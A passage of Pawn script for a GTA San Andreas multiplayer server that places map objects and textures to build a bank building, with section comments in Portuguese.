	CreateDynamicObject(2784, -38.47, 1387.00, 13.60,   0.00, 0.00, 105.11);
	CreateDynamicObject(1968, -36.84, 1389.44, 12.81,   0.00, 0.00, 104.41);
	CreateDynamicObject(1968, -35.39, 1382.30, 12.81,   0.00, 0.00, 104.41);
	CreateDynamicObject(1968, -33.00, 1382.83, 12.81,   0.00, 0.00, 104.41);
	CreateDynamicObject(1968, -30.32, 1383.47, 12.81,   0.00, 0.00, 104.41);
	CreateDynamicObject(1968, -36.11, 1385.89, 12.81,   0.00, 0.00, 104.41);
	CreateDynamicObject(1968, -33.84, 1386.44, 12.81,   0.00, 0.00, 104.41);
	CreateDynamicObject(1968, -31.03, 1387.12, 12.81,   0.00, 0.00, 104.41);
	CreateDynamicObject(1968, -31.88, 1390.64, 12.81,   0.00, 0.00, 104.41);
	CreateDynamicObject(1968, -34.70, 1389.96, 12.81,   0.00, 0.00, 104.41);
	CreateDynamicObject(1717, -20.85, 1393.15, 12.18,   0.00, 0.00, 239.18);
	CreateDynamicObject(1717, -25.81, 1412.89, 12.18,   0.00, 0.00, 239.18);
	CreateDynamicObject(1717, -24.58, 1408.22, 12.18,   0.00, 0.00, 239.18);
	CreateDynamicObject(1717, -22.00, 1397.81, 12.18,   0.00, 0.00, 239.18);
	CreateDynamicObject(2790, -24.62, 1411.86, 14.01,   0.00, 0.00, 284.06);
	CreateDynamicObject(2789, -21.41, 1399.14, 13.74,   0.00, 0.00, 284.22);
	CreateDynamicObject(16782, -30.96, 1426.28, 13.99,   0.00, 0.00, 283.02);
	CreateDynamicObject(3279, 64.08, 1388.85, 10.66,   0.00, 0.00, 11.08);
	CreateDynamicObject(1572, -44.31, 1413.96, 12.86,   0.00, 0.00, 324.71);
	CreateDynamicObject(1572, -46.62, 1416.50, 12.86,   0.00, 0.00, 0.00);
	CreateDynamicObject(1572, -46.02, 1414.89, 12.86,   0.00, 0.00, 163.48);
	CreateDynamicObject(1572, -44.83, 1411.55, 12.86,   0.00, 0.00, 268.19);
	CreateDynamicObject(1682, -22.42, 1375.51, 22.79,   0.00, 0.00, 247.61);
	CreateDynamicObject(12814, -26.40, 1393.11, 12.30,   0.00, 0.00, 14.19);
	CreateDynamicObject(3578, -20.23, 1397.37, 11.54,   0.00, 0.00, 284.40);
	CreateDynamicObject(3578, -28.95, 1360.06, 11.52,   0.00, 0.00, 285.15);
	CreateDynamicObject(3578, -23.24, 1409.63, 11.54,   0.00, 0.00, 284.40);
	CreateDynamicObject(3578, 51.41, 1340.33, 11.52,   0.00, 0.00, 284.40);
	CreateDynamicObject(3578, -23.32, 1431.91, 11.52,   0.00, 0.00, 193.83);
	CreateDynamicObject(3578, -11.26, 1430.12, 11.52,   0.00, 0.00, 284.40);
	CreateDynamicObject(3578, -9.51, 1435.31, 11.52,   0.00, 0.00, 193.83);
	CreateDynamicObject(3578, -18.84, 1433.01, 11.52,   0.00, 0.00, 193.83);
	CreateDynamicObject(2797, -22.47, 1367.63, 15.38,   0.00, 0.00, 14.33);
	CreateDynamicObject(0, -24.41, 1414.43, 12.62,   0.00, 0.00, 0.00);
	CreateDynamicObject(3666, -15.71, 1379.21, 12.62,   0.00, 0.00, 0.00);
	CreateDynamicObject(3666, -18.21, 1389.07, 12.62,   0.00, 0.00, 0.00);
	CreateDynamicObject(3666, -18.96, 1392.50, 12.62,   0.00, 0.00, 0.00);
	CreateDynamicObject(3666, -21.34, 1402.20, 12.62,   0.00, 0.00, 0.00);
	CreateDynamicObject(3666, -21.95, 1404.85, 12.62,   0.00, 0.00, 0.00);
	CreateDynamicObject(983, -12.21, 1344.28, 12.54,   0.00, 0.00, 283.89);
	CreateDynamicObject(983, -33.08, 1364.39, 13.10,   0.00, 0.00, 284.00);
	CreateDynamicObject(983, -30.00, 1361.92, 13.10,   0.00, 0.00, 194.55);
	CreateDynamicObject(984, 13.88, 1401.60, 12.54,   0.00, 0.00, 282.46);
	CreateDynamicObject(984, -27.60, 1352.67, 12.95,   0.00, 0.00, 14.37);
	CreateDynamicObject(983, -25.45, 1344.21, 13.10,   0.00, 0.00, 194.55);
	CreateDynamicObject(2773, -35.49, 1419.84, 12.81,   0.00, 0.00, 104.65);
	CreateDynamicObject(2773, -47.49, 1419.64, 12.81,   0.00, 0.00, 104.65);
	CreateDynamicObject(2773, -45.58, 1420.09, 12.81,   0.00, 0.00, 104.65);
	CreateDynamicObject(2773, -43.71, 1420.57, 12.81,   0.00, 0.00, 104.65);
	CreateDynamicObject(2773, -40.13, 1418.04, 12.81,   0.00, 0.00, 193.84);
	CreateDynamicObject(2773, -36.34, 1423.03, 12.81,   0.00, 0.00, 104.65);
	CreateDynamicObject(16154, -34.63, 1423.37, 12.29,   0.00, 0.00, 103.83);
	CreateDynamicObject(2773, -41.86, 1421.05, 12.81,   0.00, 0.00, 104.65);
	CreateDynamicObject(2773, -40.66, 1420.29, 12.81,   0.00, 0.00, 193.84);
	CreateDynamicObject(3658, -44.19, 1419.34, 12.79,   0.00, 0.00, 193.59);
	CreateDynamicObject(2775, -32.83, 1419.56, 15.47,   0.00, 0.00, 280.80);
	CreateDynamicObject(2775, -33.94, 1424.26, 15.47,   0.00, 0.00, 280.80);
	CreateDynamicObject(3657, -23.44, 1391.34, 12.69,   0.00, 0.00, 104.55);
	CreateDynamicObject(3657, -22.01, 1385.62, 12.69,   0.00, 0.00, 104.55);
	CreateDynamicObject(3657, -23.72, 1385.19, 12.69,   0.00, 0.00, 104.55);
	CreateDynamicObject(3657, -21.85, 1377.61, 12.69,   0.00, 0.00, 104.55);
	CreateDynamicObject(3657, -19.97, 1378.07, 12.69,   0.00, 0.00, 104.55);
	CreateDynamicObject(3657, -24.93, 1370.56, 12.69,   0.00, 0.00, 13.62);
	CreateDynamicObject(3657, -31.03, 1369.06, 12.69,   0.00, 0.00, 13.62);
	CreateDynamicObject(3657, -31.47, 1370.82, 12.69,   0.00, 0.00, 13.62);
	CreateDynamicObject(3095, -43.70, 1418.85, 11.75,   0.00, 0.00, 13.89);
	CreateDynamicObject(3095, -44.64, 1418.71, 15.79,   0.00, 0.00, 13.89);
	CreateDynamicObject(3095, -36.20, 1420.80, 15.79,   0.00, 0.00, 13.89);
	CreateDynamicObject(3095, -31.40, 1421.98, 15.79,   0.00, 0.00, 13.89);
	CreateDynamicObject(3095, -32.31, 1369.39, 15.79,   0.00, 0.00, 13.89);
	CreateDynamicObject(3095, -42.54, 1410.11, 15.79,   0.00, 0.00, 13.89);
	CreateDynamicObject(3095, -29.30, 1413.40, 15.79,   0.00, 0.00, 13.89);
	CreateDynamicObject(3095, -19.21, 1372.68, 15.79,   0.00, 0.00, 13.89);
	CreateDynamicObject(3095, -33.73, 1403.05, 15.79,   0.00, 0.00, 13.89);
	CreateDynamicObject(3095, -25.75, 1371.05, 15.79,   0.00, 0.00, 13.89);
	CreateDynamicObject(3095, -27.16, 1404.76, 15.79,   0.00, 0.00, 13.89);
	CreateDynamicObject(3095, -40.41, 1401.45, 15.79,   0.00, 0.00, 13.89);
	CreateDynamicObject(3095, -38.28, 1393.05, 15.79,   0.00, 0.00, 13.89);
	CreateDynamicObject(3095, -36.13, 1384.60, 15.79,   0.00, 0.00, 13.89);
	CreateDynamicObject(3095, -34.07, 1376.51, 15.79,   0.00, 0.00, 13.89);
	CreateDynamicObject(3095, -31.62, 1394.73, 15.79,   0.00, 0.00, 13.89);
	CreateDynamicObject(3095, -29.47, 1386.09, 15.79,   0.00, 0.00, 13.89);
	CreateDynamicObject(3095, -27.39, 1377.67, 15.79,   0.00, 0.00, 13.89);
	CreateDynamicObject(3095, -25.05, 1396.25, 15.79,   0.00, 0.00, 13.89);
	CreateDynamicObject(3095, -22.99, 1387.95, 15.79,   0.00, 0.00, 13.89);
	CreateDynamicObject(3095, -20.91, 1379.56, 15.79,   0.00, 0.00, 13.89);
	CreateDynamicObject(16154, -33.77, 1419.89, 12.29,   0.00, 0.00, 103.83);
	CreateDynamicObject(3578, -17.04, 1384.32, 11.54,   0.00, 0.00, 284.40);
	CreateDynamicObject(3578, -23.80, 1361.45, 11.52,   0.00, 0.00, 194.94);
	CreateDynamicObject(3578, 4.54, 1341.92, 11.52,   0.00, 0.00, 285.17);
	CreateDynamicObject(3578, -20.37, 1348.11, 11.52,   0.00, 0.00, 194.94);
	CreateDynamicObject(984, -18.45, 1342.71, 12.54,   0.00, 0.00, 104.16);
	CreateDynamicObject(984, -7.31, 1338.91, 12.54,   0.00, 0.00, 194.08);
	CreateDynamicObject(984, 4.35, 1317.81, 12.54,   0.00, 0.00, 282.46);
	CreateDynamicObject(984, -4.31, 1326.58, 12.54,   0.00, 0.00, 194.08);
	CreateDynamicObject(984, -10.71, 1435.59, 12.54,   0.00, 0.00, 283.69);
	CreateDynamicObject(984, 21.30, 1328.53, 12.54,   0.00, 0.00, 193.26);
	CreateDynamicObject(984, 18.43, 1340.62, 12.54,   0.00, 0.00, 193.26);
	CreateDynamicObject(984, 15.42, 1352.89, 12.54,   0.00, 0.00, 193.26);
	CreateDynamicObject(984, 12.59, 1365.18, 12.54,   0.00, 0.00, 193.26);
	CreateDynamicObject(984, 16.16, 1320.41, 12.54,   0.00, 0.00, 282.46);
	CreateDynamicObject(984, 18.41, 1380.88, 12.54,   0.00, 0.00, 282.46);
	CreateDynamicObject(3578, -20.16, 1428.11, 11.52,   0.00, 0.00, 284.40);
	CreateDynamicObject(3578, 31.73, 1421.17, 11.52,   0.00, 0.00, 284.40);
	CreateDynamicObject(3578, 16.71, 1391.31, 11.52,   0.00, 0.00, 13.48);
	CreateDynamicObject(3578, 42.05, 1378.29, 11.52,   0.00, 0.00, 284.40);
	CreateDynamicObject(3578, 46.81, 1358.23, 11.52,   0.00, 0.00, 284.40);
	CreateDynamicObject(3578, 37.04, 1399.46, 11.52,   0.00, 0.00, 284.40);
	CreateDynamicObject(1278, -34.86, 1364.43, 8.75,   0.00, 0.00, 253.30);
	CreateDynamicObject(1278, -47.39, 1422.85, 8.75,   0.00, 0.00, 333.24);
	CreateDynamicObject(621, -39.98, 1362.32, 6.90,   0.00, 0.00, 0.00);
	CreateDynamicObject(621, -53.37, 1422.51, 6.90,   0.00, 0.00, 0.00);
	CreateDynamicObject(984, 10.81, 1372.44, 12.54,   0.00, 0.00, 193.26);
	CreateDynamicObject(984, 2.88, 1406.32, 12.54,   0.00, 0.00, 193.26);
	CreateDynamicObject(984, -0.07, 1418.83, 12.54,   0.00, 0.00, 193.26);
	CreateDynamicObject(984, -2.94, 1430.94, 12.54,   0.00, 0.00, 193.26);
	CreateDynamicObject(984, -27.50, 1424.92, 12.54,   0.00, 0.00, 193.26);
	CreateDynamicObject(984, -22.72, 1432.70, 12.54,   0.00, 0.00, 284.25);
	CreateDynamicObject(3578, -25.40, 1346.84, 11.52,   0.00, 0.00, 285.17);
	CreateDynamicObject(2860, -36.24, 1385.58, 13.08,   0.00, 0.00, 0.00);
	CreateDynamicObject(2840, -34.02, 1386.10, 13.05,   0.00, 0.00, 0.00);
	CreateDynamicObject(2840, -33.88, 1386.38, 13.05,   0.00, 0.00, 0.00);
	CreateDynamicObject(2838, -26.77, 1378.16, 13.07,   0.00, 0.00, 0.00);
	CreateDynamicObject(2840, -30.22, 1377.52, 13.07,   0.00, 0.00, 0.00);
	CreateDynamicObject(2837, -34.91, 1376.22, 13.07,   0.00, 0.00, 0.00);
	CreateDynamicObject(2839, -31.85, 1390.44, 13.06,   0.00, 0.00, 0.00);
	CreateDynamicObject(2866, -34.78, 1390.01, 13.07,   0.00, 0.00, 0.00);
	CreateDynamicObject(2823, -36.83, 1389.23, 13.06,   0.00, 0.00, 0.00);
	CreateDynamicObject(2427, -38.33, 1385.60, 13.11,   0.00, 0.00, 105.77);
	CreateDynamicObject(2425, -38.17, 1385.10, 13.11,   0.00, 0.00, 108.22);
	CreateDynamicObject(2453, -38.29, 1386.72, 13.45,   0.00, 0.00, 0.00);
	CreateDynamicObject(2356, -32.99, 1420.71, 12.32,   0.00, 0.00, 171.37);
	CreateDynamicObject(2356, -30.74, 1420.39, 12.32,   0.00, 0.00, 0.00);
	CreateDynamicObject(16480, -42.12, 1391.78, 18.94,   0.00, 0.00, 239.05);
	// BANCO NOVO
	// -------------- BANCO WE ------------ //

	new nomeBanco = CreateObject(19353, 1778.4528, -1720.8015, 20.7428, 0.0000, 0.0000, 265.9266);
	SetObjectMaterialText(nomeBanco, "BANCO", 0, 50, "ARIAL", 35, 1, -1, 0, 1);

	new world = CreateObject(19353, 1777.0195, -1720.6309, 19.1728, 0.0000, 0.0000, -89.3504);
	SetObjectMaterialText(world, "World", 0, 50, "Arial", 34, 1, -1, 0, 1);

	new Evolution = CreateObject(19353, 1779.8288, -1720.6850, 19.1928, 0.0000, 0.0000, 269.0833);
	SetObjectMaterialText(Evolution, "Evolution", 0, 50, "Arial", 34, 1, -1, 0, 1);

  	new paredeplaca = CreateObject(19455, 1778.49243, -1720.46790, 20.02130,   0.00000, 0.00000, 90.00000);
    SetObjectMaterial(paredeplaca,0,1786, "cj_tv", "CJ_Black_metal");

	//PAREDES EXTERIOR //

	paredesexterior[0] = CreateDynamicObjectEx(19378, 1761.70789, -1698.39038, 17.10000,   90.00000, 0.00000, 0.00000);
	paredesexterior[1] = CreateDynamicObjectEx(19378, 1761.73083, -1708.79089, 17.10000,   90.00000, 0.00000, 0.00000);
	paredesexterior[2] = CreateDynamicObjectEx(19378, 1768.74768, -1690.34424, 17.10000,   90.00000, 0.00000, 90.00000);
	paredesexterior[3] = CreateDynamicObjectEx(19378, 1779.09497, -1690.35779, 17.10000,   90.00000, 0.00000, 90.00000);
	paredesexterior[4] = CreateDynamicObjectEx(19378, 1787.79504, -1690.37012, 17.10000,   90.00000, 0.00000, 90.00000);
	paredesexterior[5] = CreateDynamicObjectEx(19378, 1794.82849, -1709.01599, 17.10000,   90.00000, 0.00000, 0.00000);
	paredesexterior[6] = CreateDynamicObjectEx(19378, 1794.82227, -1698.59473, 17.10000,   90.00000, 0.00000, 0.00000);
	paredesexterior[7] = CreateDynamicObjectEx(19412, 1765.32520, -1717.22815, 14.21990,   0.00000, 0.00000, 90.00000);
	paredesexterior[8] = CreateDynamicObjectEx(19412, 1768.52368, -1717.22839, 14.21990,   0.00000, 0.00000, 90.00000);
	paredesexterior[9] = CreateDynamicObjectEx(19412, 1771.72388, -1717.22888, 14.21990,   0.00000, 0.00000, 90.00000);
	paredesexterior[10] = CreateDynamicObjectEx(19412, 1791.48767, -1717.22815, 14.21990,   0.00000, 0.00000, 90.00000);
	paredesexterior[11] = CreateDynamicObjectEx(19412, 1788.30701, -1717.22815, 14.21990,   0.00000, 0.00000, 90.00000);
	paredesexterior[12] = CreateDynamicObjectEx(19412, 1788.30701, -1717.22815, 14.21990,   0.00000, 0.00000, 90.00000);
	paredesexterior[13] = CreateDynamicObjectEx(19412, 1785.10083, -1717.22815, 14.21990,   0.00000, 0.00000, 90.00000);
	paredesexterior[14] = CreateDynamicObjectEx(19458, 1768.49451, -1717.20984, 17.68000,   0.00000, 0.00000, 90.00000); //
	paredesexterior[15] = CreateDynamicObjectEx(19458, 1788.26672, -1717.26465, 17.68000,   0.00000, 0.00000, 90.00000);
	paredesexterior[16] = CreateDynamicObjectEx(19458, 1788.27173, -1717.24524, 20.20000,   0.00000, 0.00000, 90.00000);
	paredesexterior[17] = CreateDynamicObjectEx(19458, 1768.49146, -1717.19910, 20.20000, 0.00000, 0.00000, 90.00000); //
	paredesexterior[18] = CreateDynamicObjectEx(19366, 1778.37500, -1717.13977, 16.73100,   0.00000, 0.00000, 90.00000);
	paredesexterior[19] = CreateDynamicObjectEx(19366, 1778.37500, -1717.13977, 20.18000,   0.00000, 0.00000, 90.00000);

	for(new i = 0; i != 20; i++) SetDynamicObjectMaterial(paredesexterior[i], 0, 4600, "theatrelan2", "gm_labuld2_b");


	// COLUNAS EXTERIOR //

	colunasbanco[0] = CreateDynamicObjectEx(19458, 1760.19836, -1714.89795, 17.12000,   90.00000, 0.00000, -60.00000);
	colunasbanco[1] = CreateDynamicObjectEx(19458, 1762.13379, -1718.02441, 17.12000,   90.00000, 0.00000, -60.00000);
	colunasbanco[2] = CreateDynamicObjectEx(19458, 1759.72058, -1717.29443, 17.12000,   90.00000, 0.00000, 31.74000);
	colunasbanco[3] = CreateDynamicObjectEx(19458, 1794.60376, -1717.95825, 17.12000,   90.00000, 0.00000, 60.00000);
	colunasbanco[4] = CreateDynamicObjectEx(19458, 1762.03784, -1689.53503, 17.12000,   90.00000, 0.00000, 60.00000);
	colunasbanco[5] = CreateDynamicObjectEx(19458, 1759.62256, -1690.06909, 17.12000,   90.00000, 0.00000, -31.74000);
	colunasbanco[6] = CreateDynamicObjectEx(19458, 1794.52454, -1689.52344, 17.12000,   90.00000, 0.00000, -60.00000);
	colunasbanco[7] = CreateDynamicObjectEx(19458, 1773.30811, -1718.78259, 17.12000,   90.00000, 0.00000, 0.00000);
	colunasbanco[8] = CreateDynamicObjectEx(19458, 1796.40186, -1692.51184, 17.12000,   90.00000, 0.00000, -60.00000);
	colunasbanco[9] = CreateDynamicObjectEx(19458, 1796.94165, -1690.25085, 17.12000,   90.00000, 0.00000, 31.74000);
	colunasbanco[10] = CreateDynamicObjectEx(19458, 1796.52014, -1715.05664, 17.12000,   90.00000, 0.00000, 60.00000);
	colunasbanco[11] = CreateDynamicObjectEx(19458, 1797.08203, -1717.32214, 17.12000,   90.00000, 0.00000, -31.74000);
	colunasbanco[12] = CreateDynamicObjectEx(19458, 1760.30042, -1692.32202, 17.12000,   90.00000, 0.00000, 60.00000);
	colunasbanco[13] = CreateDynamicObjectEx(19458, 1783.55261, -1718.78259, 17.12000,   90.00000, 0.00000, 0.00000);
	colunasbanco[14] = CreateDynamicObjectEx(19458, 1780.03064, -1718.78259, 17.12000,   90.00000, 0.00000, 0.00000);
	colunasbanco[15] = CreateDynamicObjectEx(19458, 1776.74939, -1718.78259, 17.12000,   90.00000, 0.00000, 0.00000);
	colunasbanco[16] = CreateDynamicObjectEx(19458, 1775.06555, -1720.45215, 17.12000,   90.00000, 0.00000, 90.00000);
	colunasbanco[17] = CreateDynamicObjectEx(19458, 1781.87463, -1720.45947, 17.12000,   90.00000, 0.00000, 90.00000);
	colunasbanco[18] = CreateDynamicObjectEx(19366, 1778.39160, -1718.79150, 14.95100,   0.00000, 90.00000, 90.00000);

	for(new i = 0; i != 19 ; i++) SetDynamicObjectMaterial(colunasbanco[i],0,1786, "cj_tv", "CJ_Black_metal");

	// JANELAS BANCO //

	janelasbanco[0] = CreateDynamicObjectEx(19449, 1768.61011, -1717.25122, 17.54880,   0.00000, 0.00000, 90.00000);
	janelasbanco[1] = CreateDynamicObjectEx(19449, 1761.70105, -1708.69519, 17.54880,   0.00000, 0.00000, 0.00000);
	janelasbanco[2] = CreateDynamicObjectEx(19449, 1761.66858, -1698.39844, 17.54880,   0.00000, 0.00000, 0.00000);
	janelasbanco[3] = CreateDynamicObjectEx(19449, 1768.62244, -1690.29724, 17.54880,   0.00000, 0.00000, 90.00000);
	janelasbanco[4] = CreateDynamicObjectEx(19449, 1787.88733, -1690.30823, 17.54880,   0.00000, 0.00000, 90.00000);
	janelasbanco[5] = CreateDynamicObjectEx(19449, 1778.26245, -1690.27148, 17.54880,   0.00000, 0.00000, 90.00000);
	janelasbanco[6] = CreateDynamicObjectEx(19449, 1794.85413, -1698.58276, 17.54880,   0.00000, 0.00000, 0.00000);
	janelasbanco[7] = CreateDynamicObjectEx(19449, 1794.83240, -1708.83911, 17.54880,   0.00000, 0.00000, 0.00000);
	janelasbanco[8] = CreateDynamicObjectEx(19449, 1788.15845, -1717.29919, 17.54880,   0.00000, 0.00000, 90.00000);

	for(new i = 0; i != 9 ; i++) SetDynamicObjectMaterial(janelasbanco[i],0,4141, "civic01_lan", "sl_laglasswall2");

	// PAREDES INTERIOR BANCO//

	paredesinteriorbanco[0] = CreateDynamicObjectEx(19450, 1763.95630, -1712.26245, 14.21990,   0.00000, 0.00000, 0.00000);
	paredesinteriorbanco[1] = CreateDynamicObjectEx(19450, 1763.95044, -1702.78455, 14.21990,   0.00000, 0.00000, 0.00000);
	paredesinteriorbanco[2] = CreateDynamicObjectEx(19450, 1763.93469, -1696.36353, 14.21990,   0.00000, 0.00000, 0.00000);
	paredesinteriorbanco[3] = CreateDynamicObjectEx(19450, 1768.90454, -1691.76782, 14.21990,   0.00000, 0.00000, 90.00000);
	paredesinteriorbanco[4] = CreateDynamicObjectEx(19450, 1778.48792, -1691.75940, 14.21990,   0.00000, 0.00000, 90.00000);
	paredesinteriorbanco[5] = CreateDynamicObjectEx(19450, 1788.05884, -1691.77075, 14.21990,   0.00000, 0.00000, 90.00000);
	paredesinteriorbanco[6] = CreateDynamicObjectEx(19450, 1792.80969, -1696.70142, 14.21990,   0.00000, 0.00000, 0.00000);
	paredesinteriorbanco[7] = CreateDynamicObjectEx(19450, 1792.80054, -1706.13464, 14.21990,   0.00000, 0.00000, 0.00000);
	paredesinteriorbanco[8] = CreateDynamicObjectEx(19450, 1792.82300, -1712.30884, 14.21990,   0.00000, 0.00000, 0.00000);
	paredesinteriorbanco[9] = CreateDynamicObjectEx(19450, 1788.09314, -1701.48828, 14.21990,   0.00000, 0.00000, 90.00000);
	paredesinteriorbanco[10] = CreateDynamicObjectEx(19450, 1788.16357, -1710.92859, 14.21990,   0.00000, 0.00000, 90.00000);
	paredesinteriorbanco[11] = CreateDynamicObjectEx(19450, 1768.78552, -1701.48669, 14.21990,   0.00000, 0.00000, 90.00000);
	paredesinteriorbanco[12] = CreateDynamicObjectEx(19450, 1776.95190, -1701.46265, 11.99990,   0.00000, 0.00000, 90.00000);
	paredesinteriorbanco[13] = CreateDynamicObjectEx(19404, 1791.48865, -1717.07092, 14.21990,   0.00000, 0.00000, 90.00000);
	paredesinteriorbanco[14] = CreateDynamicObjectEx(19388, 1783.37927, -1706.23584, 14.21990,   0.00000, 0.00000, 0.00000);
	paredesinteriorbanco[15] = CreateDynamicObjectEx(19358, 1783.37927, -1703.10913, 14.21990,   0.00000, 0.00000, 0.00000);
	paredesinteriorbanco[16] = CreateDynamicObjectEx(19358, 1783.37976, -1709.38550, 14.21990,   0.00000, 0.00000, 0.00000);
	paredesinteriorbanco[17] = CreateDynamicObjectEx(19404, 1788.30579, -1717.07068, 14.21990,   0.00000, 0.00000, 90.00000);
	paredesinteriorbanco[18] = CreateDynamicObjectEx(19404, 1765.31067, -1717.07092, 14.21990,   0.00000, 0.00000, 90.00000);
	paredesinteriorbanco[19] = CreateDynamicObjectEx(19404, 1785.10083, -1717.06921, 14.21990,   0.00000, 0.00000, 90.00000);
	paredesinteriorbanco[20] = CreateDynamicObjectEx(19358, 1775.24548, -1717.07092, 14.21990,   0.00000, 0.00000, 90.00000);
	paredesinteriorbanco[21] = CreateDynamicObjectEx(19358, 1781.52185, -1717.02991, 14.21990,   0.00000, 0.00000, 90.00000);
	paredesinteriorbanco[22] = CreateDynamicObjectEx(19358, 1782.05469, -1717.07983, 14.21990,   0.00000, 0.00000, 90.00000);
	paredesinteriorbanco[23] = CreateDynamicObjectEx(19404, 1768.51196, -1717.07104, 14.21990,   0.00000, 0.00000, 90.00000);
	paredesinteriorbanco[24] = CreateDynamicObjectEx(19404, 1771.71204, -1717.07092, 14.21990,   0.00000, 0.00000, 90.00000);
	paredesinteriorbanco[25] = CreateDynamicObjectEx(19358, 1774.22522, -1717.09094, 14.21990,   0.00000, 0.00000, 90.00000);
	paredesinteriorbanco[26] = CreateDynamicObjectEx(19358, 1763.81543, -1714.45190, 14.21990,   0.00000, 0.00000, 90.00000);
	paredesinteriorbanco[27] = CreateDynamicObjectEx(19358, 1763.81543, -1712.53308, 14.21990,   0.00000, 0.00000, 90.00000);
	paredesinteriorbanco[28] = CreateDynamicObjectEx(19358, 1763.84180, -1710.70215, 14.21990,   0.00000, 0.00000, 90.00000);
	paredesinteriorbanco[29] = CreateDynamicObjectEx(19358, 1763.81543, -1708.96094, 14.21990,   0.00000, 0.00000, 90.00000);
	paredesinteriorbanco[30] = CreateDynamicObjectEx(19358, 1763.81543, -1707.28906, 14.21990,   0.00000, 0.00000, 90.00000);
	paredesinteriorbanco[31] = CreateDynamicObjectEx(19358, 1763.81543, -1705.55090, 14.21990,   0.00000, 0.00000, 90.00000);
	paredesinteriorbanco[32] = CreateDynamicObjectEx(19358, 1763.80664, -1703.77783, 14.21990,   0.00000, 0.00000, 90.00000);
	paredesinteriorbanco[33] = CreateDynamicObjectEx(19388, 1783.37817, -1693.45166, 14.21990,   0.00000, 0.00000, 0.00000);
	paredesinteriorbanco[34] = CreateDynamicObjectEx(19358, 1783.37927, -1699.82532, 14.21990,   0.00000, 0.00000, 0.00000);
	paredesinteriorbanco[35] = CreateDynamicObjectEx(19358, 1783.38037, -1696.65308, 14.21990,   0.00000, 0.00000, 0.00000);
	paredesinteriorbanco[36] = CreateDynamicObjectEx(19358, 1770.63855, -1699.82581, 14.21990,   0.00000, 0.00000, 0.00000);
	paredesinteriorbanco[37] = CreateDynamicObjectEx(19358, 1770.65503, -1696.71045, 14.21990,   0.00000, 0.00000, 0.00000);
	paredesinteriorbanco[38] = CreateDynamicObjectEx(19431, 1770.63513, -1692.37671, 14.21990,   0.00000, 0.00000, 0.00000);
	paredesinteriorbanco[39] = CreateDynamicObjectEx(19358, 1770.60950, -1693.76477, 17.10000,   0.00000, 0.00000, 0.00000);
	paredesinteriorbanco[40] = CreateDynamicObjectEx(19358, 1770.60950, -1693.76477, 17.10000,   0.00000, 0.00000, 0.00000);
	paredesinteriorbanco[41] = CreateDynamicObjectEx(19358, 1778.36609, -1717.10181, 16.62000,   0.00000, 0.00000, 90.00000);
	paredesinteriorbanco[42] = CreateDynamicObjectEx(19431, 1782.53186, -1701.47473, 16.75990,   0.00000, 0.00000, 90.00000);

	for(new i = 0; i != 43 ; i++) SetDynamicObjectMaterial(paredesinteriorbanco[i],0,4718, "buildblk555", "gm_labuld5_b");

	// TETO INTERIOR BANCO /

	tetointeriorbanco[0] = CreateDynamicObjectEx(19376, 1787.85889, -1712.41797, 16.04000,   0.00000, 90.00000, 0.00000);
	tetointeriorbanco[1] = CreateDynamicObjectEx(19376, 1787.98193, -1695.09375, 16.04000,   0.00000, 90.00000, 0.00000);
	tetointeriorbanco[2] = CreateDynamicObjectEx(19376, 1778.12219, -1696.18396, 16.02000,   0.00000, 90.00000, 0.00000);
	tetointeriorbanco[3] = CreateDynamicObjectEx(19376, 1778.13562, -1705.73279, 16.02000,   0.00000, 90.00000, 0.00000);
	tetointeriorbanco[4] = CreateDynamicObjectEx(19376, 1779.10181, -1712.36304, 16.02000,   0.00000, 90.00000, 0.00000);
	tetointeriorbanco[5] = CreateDynamicObjectEx(19376, 1768.87146, -1712.49365, 16.04000,   0.00000, 90.00000, 0.00000);
	tetointeriorbanco[6] = CreateDynamicObjectEx(19376, 1768.89844, -1703.12036, 16.04000,   0.00000, 90.00000, 0.00000);
	tetointeriorbanco[7] = CreateDynamicObjectEx(19376, 1768.60437, -1695.64258, 16.04000,   0.00000, 90.00000, 0.00000);
	tetointeriorbanco[8] = CreateDynamicObjectEx(19452, 1784.98254, -1704.60828, 16.06000,   0.00000, 90.00000, 0.00000);
	tetointeriorbanco[9] = CreateDynamicObjectEx(19452, 1791.20959, -1706.29773, 16.06000,   0.00000, 90.00000, 0.00000);
	tetointeriorbanco[10] = CreateDynamicObjectEx(19452, 1786.38647, -1700.99890, 16.08000,   0.00000, 90.00000, 90.00000);
	tetointeriorbanco[11] = CreateDynamicObjectEx(19452, 1785.32239, -1704.44482, 16.08000,   0.00000, 90.00000, 90.00000);
	tetointeriorbanco[12] = CreateDynamicObjectEx(19452, 1786.22070, -1704.53455, 16.06000,   0.00000, 90.00000, 0.00000);

	for(new i = 0; i != 13 ; i++) SetDynamicObjectMaterial(tetointeriorbanco[i],0,1786, "cj_tv", "CJ_Black_metal");

	// PISO INTERIOR BANCO //

	CreateDynamicObject(19379, 1769.28833, -1712.28149, 12.42370,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19379, 1779.76819, -1712.31201, 12.42370,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19379, 1789.56665, -1712.33521, 12.42370,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19379, 1789.12952, -1702.73560, 12.42370,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19379, 1778.68689, -1702.74060, 12.42370,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19379, 1768.30908, -1702.68237, 12.42370,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19379, 1768.64966, -1696.23572, 12.42300,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19379, 1779.14050, -1696.15662, 12.42300,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19379, 1789.46521, -1696.20166, 12.42300,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19370, 1778.33813, -1718.68542, 12.42260,   0.00000, 90.00000, 0.00000);

	// CHAO //

	CreateObject(18981, 1766.88330, -1711.10242, 11.91340,   0.00000, 90.00000, 0.00000);
	CreateObject(18981, 1766.93652, -1686.47656, 11.91100,   0.00000, 90.00000, 0.00000);
	CreateObject(18981, 1791.85059, -1686.29749, 11.91100,   0.00000, 90.00000, 0.00000);
	CreateObject(18981, 1791.68604, -1711.05676, 11.91340,   0.00000, 90.00000, 0.00000);
	CreateObject(18981, 1801.57910, -1690.40466, 11.91100,   0.00000, 90.00000, 0.00000);
	CreateObject(18981, 1802.18152, -1713.93970, 11.91100,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(10183, 1807.72388, -1702.32568, 12.43740,   0.00000, 0.00000, -44.75999);
